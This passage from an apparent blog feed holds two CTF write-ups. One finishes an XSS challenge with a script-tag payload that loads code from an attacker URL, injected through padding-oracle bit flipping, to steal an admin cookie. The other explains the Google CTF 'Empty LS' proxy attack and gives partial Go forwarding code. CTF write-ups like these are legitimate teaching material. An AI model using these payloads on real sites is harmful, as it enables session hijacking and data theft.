class="hljs-string">"surname"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"middle"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"time"</span>: <span class="hljs-string">"2021-07-26 13:37:00"</span>, <span class="hljs-string">"dest"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"dep"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"flight"</span>: <span class="hljs-string">"BLZH1337"</span>}'</span><br></pre></td></tr></tbody></table></figure><p></p><p>Okay. But which one we should inject the XSS vector? You could try one by one but I think there is a hint in the source code of the challenge.</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!--</span></span><br><span class="line"><span class="hljs-comment">&lt;h2&gt;Passenger data&lt;/h2&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;h3&gt;Name:&lt;/h3&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;h4&gt;qweqwe&lt;/h4&gt;</span></span><br><span class="line"><span class="hljs-comment">--&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>It looks like the Name is what we want. So we should craft a payload like this.</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"name"</span>: <span class="hljs-string">"&lt;script src=http://your_url/?2&gt;&lt;/script&gt;"</span>, <span class="hljs-attr">"surname"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-attr">"middle"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-attr">"time"</span>: <span class="hljs-string">"2021-07-26 13:37:00"</span>, <span class="hljs-attr">"dest"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-attr">"dep"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-attr">"flight"</span>: <span class="hljs-string">"BLZH1337"</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>When we generate the ciphertext, we first need to generate a cipher whose the length of the name parameter is the same length as the name parameter in the XSS payload we constructed. In this exmaple, the name is <code>&lt;script src=http://your_url/?2&gt;&lt;/script&gt;</code> and its length is 40. Therefore, we should generate a ciphertext with a name of length 40 through the <code>/finalize</code> API. And weâ€™d better leave the other parameters as default values.</p><p></p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http:<span class="hljs-comment">//207.154.224.121:8080/finalize?lastName=1&amp;firstName=0000000000000000000000000000000000000000&amp;origin=3&amp;Gender=4&amp;destination=5</span></span><br><span class="line"></span><br><span class="line">PlainText:</span><br><span class="line">b<span class="hljs-number">'</span>{<span class="hljs-string">"name"</span>: <span class="hljs-string">"0000000000000000000000000000000000000000"</span>, <span class="hljs-string">"surname"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"middle"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"time"</span>: <span class="hljs-string">"2021-07-26 13:37:00"</span>, <span class="hljs-string">"dest"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"dep"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"flight"</span>: <span class="hljs-string">"BLZH1337"</span>}'</span><br></pre></td></tr></tbody></table></figure><p></p><p>After we get the ciphertext, we need to change the plaintext of the ciphertext using padding oracle and bit flipping.  And then use base64 and aztec code to encode the ciphertext and  upload the aztec code. At last, XSS fires!<br><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_24c61b7c1528e0c2deba998c1f559546.png" alt=""></p><p>Now, we get the adminâ€™s cookie and the source code of the adminâ€™s page. After having used the cookie to visit the page as admin, we found the page only had a search function. I thought I needed to do SQL injection to get the flag. But at last, we just searched â€˜Flaggerâ€™ as described in the challenge and got the flag.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_3e9d0f71b91d84f0ce56a2fd51c8f38f.png" alt=""></p><p>Thanks for your reading. Hope you like the writeup! XD</p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2021/07/21/google-qual-2021/</id>
        <title><![CDATA[Two Webs' Writeup in Google CTF Quals 2021]]></title>
        <updated>2021-08-12T09:17:22+08:00</updated>
        <link href="https://blog.zeddyu.info/2021/07/21/google-qual-2021/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2021/07/21/google-qual-2021/"><![CDATA[<html><head></head><body><p>I played Google CTF Quals 2021 and here is my writeup.</p><a id="more"></a><p>I played with the Tea Deliverers team in the Google CTF Quals 2021. We sovled 2 webs in Google CTF 2021 quals but I think I have only made a small contribution. In the end, we got 11th rank, sadly I couldnâ€™t do much. Hope I could do more in the next time!</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/static/google-ctf-2021.png" alt=""></p><p>OK. Letâ€™s talk about the CTF.</p><h2 id="Empty-LS"><a href="#Empty-LS" class="headerlink" title="Empty LS"></a>Empty LS</h2><p>There is a web challenge called empty ls. This challenge examines a security risk in the MTLS scenario. We could get the following information from the challenge:</p><ol><li><p>There is a website <a href="https://www.zone443.dev/" target="_blank" rel="noopener">https://www.zone443.dev/</a>. Two primary services are offered on this website.</p></li><li><ol><li>This website provides a user registration service and offers userâ€™s certificates for download. You could register a user and get a client certificate for your identity.</li><li>Another service is that it also provides a subdomain registration service. You could register a subdomain under zone443.dev and set an A record to an IP. So it means you could get a sub-domain that is entirely under your control.</li></ol></li><li><p>The challenge provides an <a href="https://www.zone443.dev/example.go" target="_blank" rel="noopener">example code</a> and a <a href="https://www.zone443.dev/clientca.crt.pem" target="_blank" rel="noopener">client CA cert</a> which could be used to verify users. Besides, you could report an URL, and the admin will check it.</p></li><li><p>There is another website <a href="https://admin.zone443.dev" target="_blank" rel="noopener">https://admin.zone443.dev</a>. If you visit the adminâ€™s website with your certificate, it will return â€˜Hello, user. You are not the admin.â€™ The â€˜userâ€™ is exactly your username when you registered on <a href="www.zone443.dev">www.zone443.dev</a>.</p></li></ol><p>So, obviously, we need to access this site as admin or steal the response when the admin visits the admin.zone443.dev in some way.</p><p>At first, I came up with an idea. Maybe we could steal the adminâ€™s client certificate when the admin visits our website. After we get the adminâ€™s certificate, we could try to use it to forge as admin and visit the admin.zone443.dev. But the idea is too naive. After I learn about some docs about MTLS, this may be impossible. So I get stuck.</p><p>Although the above idea doesnâ€™t work, I think we are still on the right way. At least, our target in this challenge is much more evident than the target in letschat. (In the challenge letschat, we even donâ€™t know what the target is, where the flag is and what we should access).</p><p>After a few hours, we found an interesting point. The certificate of the admin.zone443.dev is the wildcard. It is *.zone443.dev. But what does it mean? Then I tried to google â€˜HTTPS wildcard certificateâ€™ and â€˜TLS client auth bypassâ€™. The bad news is I couldnâ€™t get anything helpful to solve the challenge. </p><p>We are stuck again until we came up with another idea. In the period, we also found that admin.zone443.dev doesnâ€™t check the host. So this means there will be no warnings if you visit a subdomain whose A record is 34.140.9.160(the A record of admin.zone443.dev). Thatâ€™s an interesting phenomenon.</p><p>OK. Letâ€™s talk about XSS. If we want to read the content of the adminâ€™s page, we need XSS. But if weâ€™re going to XSS on our subdomain to read the content of the adminâ€™s page, we need to break the same-origin policy. Is it really a way using a feature of HTTPS we donâ€™t know to bypass the same-origin policy?</p><p>Based on the question, we thought, how about DNS Rebinding? But there are quite a few limitations. The max execution time of the botâ€™s chrome is about 10s, but the time of chromeâ€™s DNS cache is 60s. You canâ€™t set two A records when you register your subdomain, either. </p><p>It seems we are stuck again. All right.</p><p>Letâ€™s review the whole challenge. Do you still remember we could take all control of a subdomain? Yeah. It means we could do what we want to do on it. So what about traffic forwarding? If we forward the traffic to admin.zone443.dev when the admin visits our website, what do you think will happen next? The response is from admin.zone443.dev, but the domain is our domain!</p><p>Why? As we said above, the certificate of admin.zone443.dev is wildcard, and it ignores the host header in HTTP, so there will be no warnings and no errors in this period. Whatâ€™s more, for admin, he actually visits admin.zone443.dev with his certificate, and for browser, it thinks the domain admin visits is our domain. So, in this scenario, if we send an AJAX request to request the adminâ€™s response on our domain, the browser will think this request doesnâ€™t violate the same-origin policy. Because the domain which admin visit is our domain, the domain which AJAX requests is also our domain.</p><p>It makes sense! Quite like a variant DNS Rebinding. The process of the exploit is as follows.</p><ol><li>Register a subdomain through the subdomain registration service, which is provided by the challenge.</li><li>Report your subdomain to admin.</li><li>The adminâ€™s browser makes the first request. At this time, the admin will visit your site and execute javascript on your page. The JS code will make an AJAX request to your subdomain.</li><li>The second request is made by AJAX. You should forward the traffic to admin.zone443.dev at this time.</li><li>In the end, after you get the response from AJAX, send the response to your HTTP log in some way, and you could get the flag.</li></ol><p>Thatâ€™s all the process to solve the challenge. We write a go server to forward the traffic. Thanks to my great teammate.</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line">    <span class="hljs-string">"crypto/tls"</span></span><br><span class="line">    <span class="hljs-string">"crypto/x509"</span></span><br><span class="line">    <span class="hljs-string">"encoding/pem"</span></span><br><span class="line">    <span class="hljs-string">"fmt"</span></span><br><span class="line">    <span class="hljs-string">"io"</span></span><br><span class="line">    <span class="hljs-string">"io/ioutil"</span></span><br><span class="line">    <span class="hljs-string">"log"</span></span><br><span class="line">    <span class="hljs-string">"net"</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-string">"github.com/valyala/fasthttp"</span></span><br><span class="line">    <span class="hljs-string">"golang.org/x/sync/errgroup"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// clientCAPool consructs a CertPool containing the client CA.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">clientCAPool</span><span class="hljs-params">()</span><span class="hljs-params">( * x509.CertPool, error)</span></span> {</span><br><span class="line">    caCertPem, err: = ioutil.ReadFile(<span class="hljs-string">"clientca.crt.pem"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"error reading clientca cert: %v"</span>, err)</span><br><span class="line">    }</span><br><span class="line">    caCertBlock, rest: = pem.Decode(caCertPem)</span><br><span class="line">    <span class="hljs-keyword">if</span> caCertBlock == <span class="hljs-literal">nil</span> || <span class="hljs-built_in">len</span>(rest) &gt; <span class="hljs-number">0</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"error decoding clientca cert PEM block. caCertBlock: %v, len(rest): %d"</span>, caCertBlock, <span class="hljs-built_in">len</span>(rest))</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> caCertBlock.Type != <span class="hljs-string">"CERTIFICATE"</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"clientca cert had a bad type: %s"</span>, caCertBlock.Type)</span><br><span class="line">    }</span><br><span class="line">    caCert, err: = x509.ParseCertificate(caCertBlock.Bytes)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"error parsing clientca cert ASN.1 DER: %v"</span>, err)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    cas: = x509.NewCertPool()</span><br><span class="line">    cas.AddCert(caCert)</span><br><span class="line">    <span class="hljs-keyword">return</span> cas, <span class="hljs-literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">servePage</span><span class="hljs-params">(conn net.Conn)</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">    log.Printf(<span class="hljs-string">"serve page"</span>)</span><br><span class="line">    clientCA, err: = clientCAPool()</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    serverCert, err: = tls.LoadX509KeyPair(<span class="hljs-string">"fullchain.pem"</span>, <span class="hljs-string">"privkey.pem"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    tlsConn: = tls.Server(conn, &amp; tls.Config {</span><br><span class="line">        Certificates: [] tls.Certificate {</span><br><span class="line">            serverCert</span><br><span class="line">        },</span><br><span class="line">        ClientAuth: tls.VerifyClientCertIfGiven,</span><br><span class="line">        ClientCAs: clientCA,</span><br><span class="line">    })</span><br><span class="line">    err = tlsConn.Handshake()</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    }</span><br><span class="line">    srv: = fasthttp.Server {</span><br><span class="line">        DisableKeepalive: <span class="hljs-literal">true</span>,</span><br><span class="line">        Handler: fasthttp.FSHandler(<span class="hljs-string">"static"</span>, <span class="hljs-number">0</span>),</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> srv.ServeConn(tlsConn)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">serveProxy</span><span class="hljs-params">(conn net.Conn)</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">    next, err: = net.Dial(<span class="hljs-string">"tcp"</span>, <span class="hljs-string">"admin.zone443.dev:443"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">var</span> group errgroup.Group</span><br><span class="line">    group.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">        _, err: = io.Copy(conn, next)</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    })</span><br><span class="line">    group.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">        _, err: = io.Copy(next, conn)</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    })</span><br><span class="line">    <span class="hljs-keyword">return</span> group.Wait()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span 